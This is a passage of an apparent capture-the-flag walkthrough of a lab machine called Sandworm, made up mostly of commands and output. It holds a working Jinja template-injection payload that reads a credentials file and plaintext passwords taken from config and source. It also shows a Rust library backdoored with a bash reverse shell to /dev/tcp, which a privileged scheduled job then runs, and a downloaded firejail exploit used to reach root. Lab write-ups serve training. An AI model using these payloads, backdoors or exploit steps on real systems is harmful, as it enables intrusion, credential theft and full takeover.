Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sun 18 Jun 2023 05:30:02 AM UTC gpg: using RSA key B9062B438A3A6DCE1BD563D5FACA9F040BA43765 [GNUPG:] KEY_CONSIDERED B9062B438A3A6DCE1BD563D5FACA9F040BA43765 0 [GNUPG:] SIG_ID 4UaHLhTmEeAk9VDxcwq+RW+J2bI 2023-06-18 1687066202 [GNUPG:] KEY_CONSIDERED B9062B438A3A6DCE1BD563D5FACA9F040BA43765 0 [GNUPG:] GOODSIG FACA9F040BA43765 total 12 drwxrwx--- 2 nobody atlas 4096 May 4 17:30 . drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 .. -rw-r--r-- 1 nobody atlas 611 May 4 17:26 admin.json gpg: Good signature from "total 12 drwxrwx--- 2 nobody atlas 4096 May 4 17:30 . drwxrwxr-x 3 nobody atlas 4096 Jan 15 07:48 .. -rw-r--r-- 1 nobody atlas 611 May 4 17:26 admin.json " [unknown] [GNUPG:] VALIDSIG B9062B438A3A6DCE1BD563D5FACA9F040BA43765 2023-06-18 1687066202 0 4 0 1 10 01 B9062B438A3A6DCE1BD563D5FACA9F040BA43765 [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: B906 2B43 8A3A 6DCE 1BD5 63D5 FACA 9F04 0BA4 3765
```

## Foothold

Payload:

```c
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/atlas/.config/httpie/sessions/localhost_5000/admin.json').read() }}
```

Output:

```c
Signature is valid! [GNUPG:] NEWSIG gpg: Signature made Sun 18 Jun 2023 05:32:45 AM UTC gpg: using RSA key 297DED814215E0838249D00636594188E6DC19FF [GNUPG:] KEY_CONSIDERED 297DED814215E0838249D00636594188E6DC19FF 0 [GNUPG:] SIG_ID NGY9gjWWAPBSwOtsuSAWnAMacS4 2023-06-18 1687066365 [GNUPG:] KEY_CONSIDERED 297DED814215E0838249D00636594188E6DC19FF 0 [GNUPG:] GOODSIG 36594188E6DC19FF { "__meta__": { "about": "HTTPie session file", "help": "https://httpie.io/docs#sessions", "httpie": "2.6.0" }, "auth": { "password": "quietLiketheWind22", "type": null, "username": "silentobserver" }, "cookies": { "session": { "expires": null, "path": "/", "secure": false, "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA" } }, "headers": { "Accept": "application/json, */*;q=0.5" } } gpg: Good signature from "{ "__meta__": { "about": "HTTPie session file", "help": "https://httpie.io/docs#sessions", "httpie": "2.6.0" }, "auth": { "password": "quietLiketheWind22", "type": null, "username": "silentobserver" }, "cookies": { "session": { "expires": null, "path": "/", "secure": false, "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA" } }, "headers": { "Accept": "application/json, */*;q=0.5" } } " [unknown] [GNUPG:] VALIDSIG 297DED814215E0838249D00636594188E6DC19FF 2023-06-18 1687066365 0 4 0 1 10 01 297DED814215E0838249D00636594188E6DC19FF [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: 297D ED81 4215 E083 8249 D006 3659 4188 E6DC 19FF
```

| Username | Password |
| --- | --- |
| silentobserver | quietLiketheWind22 |

```c
$ ssh silentobserver@ssa.htb
The authenticity of host 'ssa.htb (10.129.163.22)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:169: [hashed name]
    ~/.ssh/known_hosts:188: [hashed name]
    ~/.ssh/known_hosts:258: [hashed name]
    ~/.ssh/known_hosts:300: [hashed name]
    ~/.ssh/known_hosts:301: [hashed name]
    ~/.ssh/known_hosts:302: [hashed name]
    ~/.ssh/known_hosts:316: [hashed name]
    ~/.ssh/known_hosts:344: [hashed name]
    (1 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ssa.htb' (ED25519) to the list of known hosts.
silentobserver@ssa.htb's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jun 18 05:41:33 AM UTC 2023

  System load:           0.0625
  Usage of /:            81.6% of 11.65GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             217
  Users logged in:       0
  IPv4 address for eth0: 10.129.163.22
  IPv6 address for eth0: dead:beef::250:56ff:fe96:87fe

  => There is 1 zombie process.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Mon Jun 12 12:03:09 2023 from 10.10.14.31
silentobserver@sandworm:~$
```

## user.txt

```c
silentobserver@sandworm:~$ cat user.txt 
5c5d197d92f80971046c5b27c851b2ed
```

## Enumeration

```c
silentobserver@sandworm:~$ id
uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
```

```c
silentobserver@sandworm:~$ sudo -l
[sudo] password for silentobserver: 
Sorry, user silentobserver may not run sudo on localhost.
```

```c
silentobserver@sandworm:/opt$ ls -la
total 16
drwxr-xr-x  4 root root  4096 Jun 18 05:44 .
drwxr-xr-x 19 root root  4096 Jun  7 13:53 ..
drwxr-xr-x  3 root atlas 4096 May  4 17:26 crates
drwxr-xr-x  5 root atlas 4096 Jun  6 11:49 tipnet
```

```c
silentobserver@sandworm:~$ find / -perm -4000 2>/dev/null
/opt/tipnet/target/debug/tipnet
/opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
/opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
/usr/local/bin/firejail
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount3
```

```c
silentobserver@sandworm:/var/www/html/SSA/SSA$ cat __init__.py 
from flask import Flask
from flask_login import LoginManager
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()

def create_app():
    app = Flask(__name__)

    app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21'
    app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'

    db.init_app(app)

    # blueprint for non-auth parts of app
    from .app import main as main_blueprint
    app.register_blueprint(main_blueprint)

    login_manager = LoginManager()
    login_manager.login_view = "main.login"
    login_manager.init_app(app)
    
    from .models import User
    @login_manager.user_loader
    def load_user(user_id):
        return User.query.get(int(user_id))

    return app
```

| Username | Password |
| --- | --- |
| atlas | GarlicAndOnionZ42 |

```c
silentobserver@sandworm:/opt/tipnet/src$ cat main.rs 
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("                                                     
             ,,                                      
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    
P'   MM   `7               MMN.    M           MM    
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    
     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
                  MM                                 
                .JMML.                               

");


    let mode = get_mode();
    
    if mode == "" {
            return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username 
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

        let valid = false;
        let mut mode = String::new();

        while ! valid {
                mode.clear();

                println!("Select mode of usage:");
                print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

                io::stdin().read_line(&mut mode).unwrap();

                match mode.trim() {
                        "a" => {
                              println!("\n[+] Upstream selected");
                              return "upstream".to_string();
                        }
                        "b" => {
                              println!("\n[+] Muscular selected");
                              return "regular".to_string();
                        }
                        "c" => {
                              println!("\n[+] Tempora selected");
                              return "emperor".to_string();
                        }
                        "d" => {
                                println!("\n[+] PRISM selected");
                                return "square".to_string();
                        }
                        "e" => {
                                println!("\n[!] Refreshing indeces!");
                                return "pull".to_string();
                        }
                        "q" | "Q" => {
                                println!("\n[-] Quitting");
                                return "".to_string();
                        }
                        _ => {
                                println!("\n[!] Invalid mode: {}", mode);
                        }
                }
        }
        return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
```

| Username | Password |
| --- | --- |
| tipnet | 4The_Greater_GoodJ4A |

## Privilege Escalation to atlas

> https://github.com/DominicBreuker/pspy

```c
$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
--2023-06-18 06:10:17--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/860f70be-0564-48f5-a9da-d1c32505ffb0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230618%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230618T061617Z&X-Amz-Expires=300&X-Amz-Signature=8d77cf76fcc705cf6ca0dec6aaa74649b56af4777236bae4c0347d815dd3839d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [following]
--2023-06-18 06:10:18--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/120821432/860f70be-0564-48f5-a9da-d1c32505ffb0?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230618%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230618T061617Z&X-Amz-Expires=300&X-Amz-Signature=8d77cf76fcc705cf6ca0dec6aaa74649b56af4777236bae4c0347d815dd3839d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                                     100%[========================================================================================================================================>]   2.96M  11.1MB/s    in 0.3s    

2023-06-18 06:10:18 (11.1 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

```c
$ python3 -m http.server 80                                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
silentobserver@sandworm:/dev/shm$ wget http://10.10.16.31/pspy64
--2023-06-18 06:16:44--  http://10.10.16.31/pspy64
Connecting to 10.10.16.31:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                                     100%[========================================================================================================================================>]   2.96M   931KB/s    in 3.6s    

2023-06-18 06:16:48 (844 KB/s) - ‘pspy64’ saved [3104768/3104768]
```

```c
silentobserver@sandworm:/dev/shm$ chmod +x pspy64
```

```c
silentobserver@sandworm:/dev/shm$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
<--- SNIP --->
```

```c
<--- SNIP --->
2023/06/18 06:56:01 CMD: UID=0     PID=192675 | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/06/18 06:56:01 CMD: UID=1000  PID=192676 | /usr/bin/cargo run --offline 
2023/06/18 06:56:02 CMD: UID=1000  PID=192677 | /usr/bin/cargo run --offline 
2023/06/18 06:56:02 CMD: UID=1000  PID=192678 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed                                                                                                                                                                                                                                           
2023/06/18 06:56:02 CMD: UID=1000  PID=192680 | /usr/bin/cargo run --offline 
2023/06/18 06:56:02 CMD: UID=1000  PID=192682 | /usr/bin/cargo run --offline 
2023/06/18 06:56:11 CMD: UID=0     PID=192689 | /bin/bash /root/Cleanup/clean_c.sh
<--- SNIP --->
```

```c
silentobserver@sandworm:/opt/crates$ ls -la
total 12
drwxr-xr-x 3 root  atlas          4096 May  4 17:26 .
drwxr-xr-x 4 root  root           4096 Jun 18 07:04 ..
drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 logger
```

```c
silentobserver@sandworm:/opt/crates/logger/src$ ls -la
total 12
drwxrwxr-x 2 atlas silentobserver 4096 May  4 17:12 .
drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 ..
-rw-rw-r-- 1 atlas silentobserver  732 May  4 17:12 lib.rs
```

```c
silentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs 
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

Modified lib.rs:

```c
silentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    
    let mut echo_hello = Command::new("bash");
    echo_hello.arg("-c")
                  .arg("bash -c 'bash -i >& /dev/tcp/10.10.16.31/6969 0>&1'");
    let hello_1 = echo_hello.output().expect("failed to execute process");
    let hello_2 = echo_hello.output().expect("failed to execute process");

    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

```c
$ bash
```

```c
$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.16.31] from (UNKNOWN) [10.129.163.22] 47350
bash: cannot set terminal process group (193596): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$
```

```c
atlas@sandworm:/opt/tipnet$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```c
$ stty raw -echo; fg
```

```c
atlas@sandworm:/opt/tipnet$ export XTERM=xterm
```

## Pivoting

```c
atlas@sandworm:/opt/tipnet$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
```

## Privilege Escalation to root

> https://seclists.org/oss-sec/2022/q2/188

```c
$ wget https://seclists.org/oss-sec/2022/q2/att-188/firejoin_py.bin
--2023-06-18 07:08:12--  https://seclists.org/oss-sec/2022/q2/att-188/firejoin_py.bin
Resolving seclists.org (seclists.org)... 45.33.49.119, 2600:3c01:e000:3e6::6d4e:7061
Connecting to seclists.org (seclists.org)|45.33.49.119|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8651 (8.4K) [application/octet-stream]
Saving to: ‘firejoin_py.bin’

firejoin_py.bin                                            100%[========================================================================================================================================>]   8.45K  --.-KB/s    in 0.04s   

2023-06-18 07:08:13 (194 KB/s) - ‘firejoin_py.bin’ saved [8651/8651]
```

```c
atlas@sandworm:/dev/shm$ wget http://10.10.16.31/firejoin_py.bin
wget http://10.10.16.31/firejoin_py.bin
--2023-06-18 07:15:19--  http://10.10.16.31/firejoin_py.bin
Connecting to 10.10.16.31:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8651 (8.4K) [application/octet-stream]
Saving to: ‘firejoin_py.bin’

     0K ........                                              100%  360K=0.02s

2023-06-18 07:15:19 (360 KB/s) - ‘firejoin_py.bin’ saved [8651/8651]
```

```c
atlas@sandworm:/dev/shm$ chmod +x firejoin_py.bin
```

I spawned a second shell.

```c
silentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    
    let mut echo_hello = Command::new("bash");
    echo_hello.arg("-c")
                  .arg("bash -c 'bash -i >& /dev/tcp/10.10.16.31/6669 0>&1'");
    let hello_1 = echo_hello.output().expect("failed to execute process");
    let hello_2 = echo_hello.output().expect("failed to execute process");

    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

```c
$ bash
```

```c
$ nc -lnvp 6669
listening on [any] 6669 ...
connect to [10.10.16.31] from (UNKNOWN) [10.129.163.22] 59276
bash: cannot set terminal process group (193447): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$
```

```c
atlas@sandworm:/opt/tipnet$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```c
$ stty raw -echo; fg
```

```c
atlas@sandworm:/opt/tipnet$ export XTERM=xterm
```

```c
atlas@sandworm:/dev/shm$ ./firejoin_py.bin
You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

On the second terminal I spawned the root shell.

```c
atlas@sandworm:/opt/tipnet$ firejail --join=193982
changing root to /proc/193982/root
Warning: cleaning all supplementary groups
Child process initialized in 6.71 ms
atlas@sandworm:/opt/tipnet$ su       
root@sandworm:/opt/tipnet#
```

## root.txt

```c
root@sandworm:~# cat root.txt
ee0340386dc0cdd15af62a9fd34477e6
```
